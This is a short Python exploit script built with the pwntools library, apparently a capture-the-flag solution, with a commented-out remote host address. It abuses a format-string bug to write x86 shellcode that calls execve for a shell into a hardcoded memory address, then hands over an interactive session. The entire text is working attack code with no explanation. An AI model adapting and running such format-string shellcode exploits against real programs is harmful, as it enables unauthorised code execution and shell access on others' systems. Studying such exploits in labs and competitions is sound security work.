#!/usr/bin/env python3
from pwn import *
from sys import argv

context.binary = argv[1]
context.terminal = ['tmux', 'splitw', '-h']

script = '''
b main
b *main+284
b *main+329
'''
if len(argv) > 2:
    p = gdb.debug(argv[1], script)
else:
    p = process(argv[1])
    # p = remote("3.127.25.28","5555")

def exec(pay):
    with process(argv[1]) as p:
        # p.recvuntil(b"shot: ")
        p.clean()
        p.sendline(pay)
        res = p.recvline()
        return res
    
fmtstr = FmtStr(exec)

p.clean()

# call eax 
eax = 0xf77ff000
buff_start = 0xffffd55c

writes = { 

    eax+(4*0): 0x2f68686a,
    eax+(4*1): 0x90736162,
    eax+(4*4): 0x90e18953,
    eax+(4*5): u32(b"\x31\xC9\x31\xD2"),
    eax+(4*6): u32(b"\x31\xC0\xB0\x0B"),
    eax+(4*7): u32(b"\xCD\x80\x90\x90"),
    
}

payload = fmtstr_payload(fmtstr.offset, writes, numbwritten=0, write_size='short')

# print( len(payload) )
# print( payload )

# with open("in", 'wb') as f:
#     f.write(payload)
#     f.close()

p.sendline(payload)
p.clean()
p.interactive()